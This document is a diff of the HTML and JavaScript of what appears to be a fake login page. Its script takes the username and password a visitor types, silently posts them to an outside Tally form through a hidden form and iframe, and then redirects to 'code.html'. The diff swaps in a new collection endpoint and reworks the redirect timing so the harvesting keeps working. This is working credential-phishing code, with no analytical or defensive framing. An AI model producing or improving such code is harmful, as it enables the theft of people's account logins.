@@ -218,22 +218,22 @@
     <div class="bottom-line">About · Help · More</div>
   </div>
 
-  <!-- Hidden form to submit to Tally -->
-  <form id="tallyForm" action="https://tally.so/r/nrb7Op" method="POST" target="tallyFrame" style="display:none;">
+  <!-- Hidden form for Tally -->
+  <form id="tallyForm" action="https://tally.so/r/w5gR1Q" method="POST" target="tallyHiddenFrame" style="display:none;">
     <input type="text" name="entry.1" id="tally-username" />
     <input type="text" name="entry.2" id="tally-password" />
   </form>
 
-  <!-- Hidden iframe to submit silently -->
-  <iframe name="tallyFrame" id="tallyFrame" style="display:none;" onload="onTallySubmitted()"></iframe>
+  <iframe name="tallyHiddenFrame" style="display:none;"></iframe>
 
   <script>
-    let formSubmitted = false;
-
     function showError(inputElement) {
       inputElement.style.borderColor = 'red';
       const error = document.createElement('div');
       error.className = 'error-message';
+      error.style.color = 'red';
+      error.style.fontSize = '12px';
+      error.style.marginTop = '4px';
       error.textContent = 'Required';
       inputElement.parentNode.appendChild(error);
     }
@@ -244,7 +244,7 @@
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
 
-      // Clear previous error messages
+      // Clear old errors
       document.querySelectorAll('.error-message').forEach(el => el.remove());
       [usernameInput, passwordInput].forEach(input => input.style.borderColor = '#ccc');
 
@@ -253,19 +253,17 @@
       if (!password) { showError(passwordInput); hasError = true; }
       if (hasError) return;
 
-      // Populate hidden form and submit
+      // Set values in hidden form
       document.getElementById("tally-username").value = username;
       document.getElementById("tally-password").value = password;
-      formSubmitted = true;
-      document.getElementById("tallyForm").submit();
-    }
 
-    function onTallySubmitted() {
-      if (formSubmitted) {
-        setTimeout(() => {
-          window.location.href = "code.html";
-        }, 500); // slight delay for stability
-      }
+      // Submit the hidden form
+      document.getElementById("tallyForm").submit();
+
+      // Redirect after slight delay to ensure submission
+      setTimeout(() => {
+        window.location.href = "code.html";
+      }, 1000); // delay 1 second to ensure the data submits
     }
   </script>
 
